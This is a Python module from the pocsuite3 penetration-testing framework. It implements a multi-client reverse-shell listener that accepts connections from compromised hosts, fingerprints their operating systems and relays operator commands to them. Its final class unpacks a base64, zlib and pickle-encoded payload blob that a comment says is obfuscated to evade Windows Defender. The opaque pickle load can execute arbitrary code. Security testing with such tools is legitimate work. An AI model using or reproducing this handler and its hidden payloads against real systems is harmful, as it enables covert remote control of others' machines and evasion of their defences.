import base64
import pickle
import zlib
import select
import socket
import threading
import time
import os
from pocsuite3.lib.utils import gen_cert
from pocsuite3.lib.core.common import data_to_stdout, has_poll, get_unicode, mosaic
from pocsuite3.lib.core.data import conf, kb, logger, paths
from pocsuite3.lib.core.datatype import AttribDict
from pocsuite3.lib.core.enums import AUTOCOMPLETE_TYPE, OS, CUSTOM_LOGGING
from pocsuite3.lib.core.exception import PocsuiteShellQuitException
from pocsuite3.lib.core.settings import DEFAULT_LISTENER_PORT
from pocsuite3.lib.core.shell import auto_completion, clear_history, save_history, load_history
from pocsuite3.lib.core.threads import exception_handled_function


def get_sock_listener(listen_port, listen_host="0.0.0.0", ipv6=False, protocol=None):
    if protocol in [None, "TCP"]:
        protocol = socket.SOCK_STREAM
    elif protocol in ["UDP"]:
        protocol = socket.SOCK_DGRAM

    if ipv6:
        s = socket.socket(socket.AF_INET6, protocol)
        if listen_host == "0.0.0.0":
            listen_host = "::"
    else:
        s = socket.socket(socket.AF_INET, protocol)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    msg = ''
    if conf.enable_tls_listener and protocol == socket.SOCK_STREAM:
        import ssl
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        cert_path = os.path.join(paths.POCSUITE_TMP_PATH, 'cacert.pem')
        gen_cert(filepath=cert_path)
        context.load_cert_chain(cert_path)
        s = context.wrap_socket(s, server_side=True)
        msg = 'TLS '
    try:
        s.bind((listen_host, listen_port))
    except socket.error:
        s.close()
        if conf.connect_back_host in kb.data.local_ips:
            logger.warn(f'unable to listen on {listen_host}:{listen_port}, check if the port is occupied.')
        return None

    if protocol == socket.SOCK_STREAM:
        msg += "listening on {0}:{1}".format(listen_host, listen_port)
        logger.log(CUSTOM_LOGGING.SYSINFO, msg)
        s.listen(5)
    return s


def get_udp_listener(listen_port=DEFAULT_LISTENER_PORT, listen_host="0.0.0.0", ipv6=False):
    return get_sock_listener(listen_port, listen_host, ipv6, "UDP")


def get_tcp_listener(listen_port=DEFAULT_LISTENER_PORT, listen_host="0.0.0.0", ipv6=False):
    return get_sock_listener(listen_port, listen_host, ipv6, "TCP")


def start_listener():
    t = threading.Thread(target=exception_handled_function, name="listener-thread", args=[listener_worker])
    t.setDaemon(True)
    t.start()


def listener_worker():
    s = get_tcp_listener(ipv6=conf.ipv6, listen_port=int(conf.connect_back_port))
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            client = AttribDict()
            client.conn = conn
            client.address = address
            kb.data.clients.append(client)
            info_msg = "new connection established from {0}".format(mosaic(address[0]))
            logger.log(CUSTOM_LOGGING.SUCCESS, info_msg)
        except Exception:
            pass


def list_clients():
    results = ''
    # https://en.wikipedia.org/wiki/Uname
    # https://en.wikipedia.org/wiki/Ver_(command)
    os_fingerprint = {
        'Linux': ['Linux', 'GNU'],
        'macOS': ['Darwin'],
        'Windows': ['Windows', 'PS ', 'C:\\', 'CYGWIN', 'MS-DOS', 'MSYS_NT', 'cmdlet'],
        'BSD': ['FreeBSD', 'OpenBSD', 'NetBSD', 'MidnightBSD'],
        'Solaris': ['SunOS']
    }
    for i, client in enumerate(kb.data.clients):
        try:
            client.conn.send(b'uname\nver\n')
            ret = poll_cmd_execute(client).lower()
            system, found = 'unknown', False
            for o, ks in os_fingerprint.items():
                if found:
                    break
                for k in ks:
                    if k.lower() in ret.lower():
                        system = o
                        found = True
                        break
        except Exception:  # If a connection fails, remove it
            del kb.data.clients[i]
            continue

        results += (f'{i}   ' + mosaic(client.address[0]) + f'     ({system})\n')
    data_to_stdout("----- Remote Clients -----" + "\n" + results)


def get_client(cmd):
    try:
        target = cmd.split(" ")[1]
        target = int(target)
        client = kb.data.clients[target]  # Connect to the selected clients
        data_to_stdout("Now Connected: {0}\n".format(mosaic(client.address[0])))
        return client
    except Exception:
        data_to_stdout("Invalid Client\n")
        return None


def send_shell_commands_for_console(client):
    module_prompt_default_template = (
        "\001\033[4m\002SHELL\001\033[0m\002 (\001\033[91m\002{hostname}\001\033[0m\002) > "
    )
    while True:
        cmd = None
        try:
            address = client.address[0]
            cmd = input(module_prompt_default_template.format(hostname=address))
            if not cmd:
                continue

            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")

            elif cmd.lower() in ("x", "q", "exit", "quit", "bye"):
                break

            client.conn.send(str.encode(cmd + '\n'))

            resp = poll_cmd_execute(client)

            data_to_stdout(resp)

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue

        except Exception as ex:
            logger.error(str(ex))
            data_to_stdout("Connection Lost\n")
            break
    return True


def send_shell_commands(client):
    auto_completion(AUTOCOMPLETE_TYPE.OS, OS.LINUX)
    while True:
        cmd = None
        try:
            address = client.address[0]
            cmd = input("{0}>: ".format(mosaic(address)))
            if not cmd:
                continue

            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)

            elif cmd.lower() in ("x", "q", "exit", "quit", "bye"):
                break

            client.conn.send(str.encode(cmd + '\n'))

            resp = poll_cmd_execute(client)

            data_to_stdout(resp)

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue

        except Exception as ex:
            logger.error(str(ex))
            data_to_stdout("Connection Lost\n")
            break


def poll_cmd_execute(client, timeout=3):
    if has_poll():
        p = select.poll()
        event_in_mask = select.POLLIN | select.POLLPRI
        event_err_mask = select.POLLERR
        event_closed_mask = select.POLLHUP | select.POLLNVAL
        event_mask = event_in_mask | event_err_mask | event_closed_mask
        p.register(client.conn, event_mask)
        count = 0
        ret = ''
        read_again = True
        while True:
            events = p.poll(100)
            if events:
                event = events[0][1]
                if event & select.POLLERR:
                    ret = "Client Hung up\n"
                    break

                ready = event & select.POLLPRI or event & select.POLLIN
                if not ready:
                    ret = "Command has no result or filtered by firewall\n"
                    break
                else:
                    time.sleep(0.05)
                    ret += get_unicode(client.conn.recv(65536))
            else:
                if ret:
                    if read_again:
                        read_again = False
                        continue
                    break
                elif count > timeout:
                    ret = "Command has no result or filtered by firewall\n"
                    break
                else:
                    data_to_stdout(".")
                    read_again = False
                    time.sleep(1)
                    count += 1

        p.unregister(client.conn)
    else:
        count = 0
        ret = ''
        read_again = True
        while True:
            ready = select.select([client.conn], [], [], 0.1)
            if ready[0]:
                time.sleep(0.05)
                ret += get_unicode(client.conn.recv(65536))
            else:
                if ret:
                    if read_again:
                        read_again = False
                        continue
                    break
                elif count > timeout:
                    ret = "Command has no result or filtered by firewall\n"
                else:
                    data_to_stdout('.')
                    read_again = False
                    time.sleep(1)
                    count += 1

    if ret and not ret.startswith('\r'):
        ret = "\r{0}".format(ret)
    if ret and not ret.endswith('\n'):
        ret = "{0}\n".format(ret)

    return ret


def print_cmd_help():
    msg = "-----   Help Menu  -----\n"
    msg += "command      description\n"
    msg += "list         list connected clients\n"
    msg += "select       select which client to send command\n"
    msg += "quit         quit shell\n"
    msg += "help         print help information\n"
    data_to_stdout(msg)


def handle_listener_connection_for_console(wait_time=3, try_count=3):
    while len(kb.data.clients) == 0:
        try:
            time.sleep(wait_time)
        except KeyboardInterrupt:
            break

    if len(kb.data.clients) > 0:
        cmd = "select 0"
        client = get_client(cmd)
        if client is not None:
            send_shell_commands_for_console(client)


def handle_listener_connection():
    _ = ["list", "select", "exit", "quit", "clear"]
    auto_completion(AUTOCOMPLETE_TYPE.POCSUITE, commands=_)

    while True:
        try:
            cmd = None
            cmd = input('shell>: ').strip()
            if not cmd:
                continue
            elif cmd.lower() in ("?", "help"):
                print_cmd_help()
            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)
            elif cmd.lower() in ("x", "q", "exit", "quit"):
                raise PocsuiteShellQuitException
            elif cmd == "list":
                list_clients()
            elif cmd.lower().split(" ")[0] in ('select', 'use'):
                client = get_client(cmd)
                if client is not None:
                    send_shell_commands(client)
            else:
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)
                load_history(AUTOCOMPLETE_TYPE.POCSUITE)
                data_to_stdout("Command Not Found... type ? for help.\n")

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue


class REVERSE_PAYLOAD:
    # Evading Windows Defender
    # Pocsuite3 is an open source security tool, not virus.
    # I believe that this is a false positive of your antivirus tool :)
    payload = (
        b'eJyVV19z20QQLzTQTqevPMLcaFRLAll2HFzAijwkrksCxvbYLm0n43Fl+ZSI2JLQ'
        b'nZuY2DPwrkfxyAsfgC/D8MKX4Cuwe5Icx6R0cGak097e7m/39l9+2vnl4uEd8Vsl'
        b'avxuu5HEzWhGSnwWllxzdu56bpB/OTbPlsvS2PNL7IwUPVKpF3aXvkOuyitytbsi'
        b'9ZQlie+2G5Uk/gC2ipTkBzIusbuXxLugq+imUkNQ5weT7IOEpFAgG3LLKT2J3zs8'
        b'6B+Vk/ijVH+9QEoT+rrEnbAEvCXBC5iSeAcZk1gd28jpEOW/DyiZaAD9eOtI4ZSb'
        b'BXsWmrecXO+hgPcHzVa7OUjiARoWbVh27chwubxpqMnp1Kf82tL9jC932m49t32n'
        b'2+y1kvjPkEZTdKsyZ5T0A+ecclP2LAlESKYcWiDGZIKs9vXu09ExgNL7ncY3o/6g'
        b'1zz4Vj+lPIwCHowXvj2jqgQmSZpmeq7qBL5PHTyHAuzJJBp5viqHugcYRzYP4MPT'
        b'4Hd1FYTUV/uDJ8dtXaoX+pJm5pTOs8E2qdnr5SR6SR1Vuo4hIK1WJrqv+3Jw1Gkn'
        b'8V/hgp8FvrgCbxYGESepOTqbjwG4QxnTA2YyKyUbmbHZ10Fmcfa5YbhmMiO3UBXu'
        b'0sFXYHnAjMk8rKjMcL0p9QNV08uaSW4h795OrmhmaF2jMxx7OlVPcislXQI7hxpa'
        b'ebd71E3iJ+FZCCFCFBlRWi4+ha+uUf3LUWS/sAfxu4dJtycJYTu9Z4cvk/jHaD5e'
        b'gLjUYhEa9NLjxHOJG0TnpmMNGt00UAyfXmRKJNACYi7OwAjVmU0sx4DAYJp53DFC'
        b'AQaIuhRJcNlLL1g6Rhh5PkgNjIjak9WK+hPE8PXBdwdJ/GtELNKb+9ybUZSTLVXt'
        b'QQgbkSGsyTyCCYY+ceCBdFLdr2/nlig4+4UqWRKBkKBOMoU4NMkkIDKu0BNVcEkV'
        b'ST6VhsRmpM8B5enJEBQbF7bHnwaRqiXxg27nebPXP2q2WsmLv9+5c0d2ph4FcyzS'
        b'phfFzvh7iArSXzBOZ0Yb40b4ixnguobgVBWApqR3IzMOeGZwOBNjfEV5X9BUzTwZ'
        b'Lzg9GQ5lfDNgKhvG42p1r7p8dAUyVpnPIZVQQCrK6IF9anpCJ2WdpEujRf1TfqZp'
        b'pAj2luEqTHlicxsOqhu4i4NFSNuQzLkFA3oJmdBvHB83fSeYgEe0DCIsczWoxUNj'
        b'4CbHtnOOQj16SVINWNvB+505L6bHyAZrRSDPz31ClG6fKPBWw4uJZnRtfobEOlGy'
        b'I6APpZ9wxEUzSMNaTUAU0A4RknqtYO1k43nkcaqu5QDs9Tp3z5r36XTOzlQNfJxf'
        b'TGMaMIoRcK/Tbbb7faigP2/WZ3ajPrMb9ZlBfd5MwIwouh5mCGNTwkZZIBV/mHuY'
        b'fVmFwYpeg2CpZ1pu6AQ0UAdGiObFQwjGdTlw+CW3UltGIAjdNXLgCxxwIoE6yaqf'
        b'SK9p5LmLUUhpBN+uPWVU3ySOsKznO8NhnuMys77MRKeVIkOuouBaqZQBlnSZRn6A'
        b'T+DW98p6Wj1HjdZxsz0YNTrtdrMx0AVW7ASZ9KnlYv0ANUgU+S5PdTmAywksqOPT'
        b'YAK95oGUkQwL1qYbzsURQVzBTymI8eDTdHjIu+L1EJH1aRgfDtd9urxf2P1srygq'
        b'JoHVLdUEOAUTVAt8VsQLqte9tGdj278xjZB/jyPbjTpvy4C2msTd/9PzNyebN/f7'
        b'u61nUFj/mM5ttF+aBtBVCLMiCoEWUVVJL1HRzHSHWzZjNII+aIDlKrQ1Xsu73Ubp'
        b'Sqspj+YU62h6NNIvLV6LqEO915ArmUA3FwgVP20Ika5Eipbvj/N9t4bFWVU+thWh'
        b'FbNTHUMH8yemW3PSBEQ02UpK4vs4y4j4j3+7Mc8cd2q1tPTCu9/CeUb0MGxoOkwo'
        b'cgjB41hbbMU69rUuxP4BzCxWXVrHMmyOstSYQQBa9XKeDmzBBGzZ0WVP/3z3iwrG'
        b'LVAv0nrj6K9k7xVGJQ6H2GkhSpztVqu4G811q4UbPBh5aVQy0TvdrX7+aALxCI8K'
        b'PiXdxT8NtN1Hbal3ft9SGOV155Yu34EtOCQ8Ih4bPf/NE4CWz0RvGQXQGvb2eeB+'
        b'u3EwSLF/6GMT3/gHoFhE5Pm/AXPjH5hWGLM='
    )
    vars().update(pickle.loads(zlib.decompress(base64.b64decode(payload))))
    del payload


if __name__ == "__main__":
    start_listener()
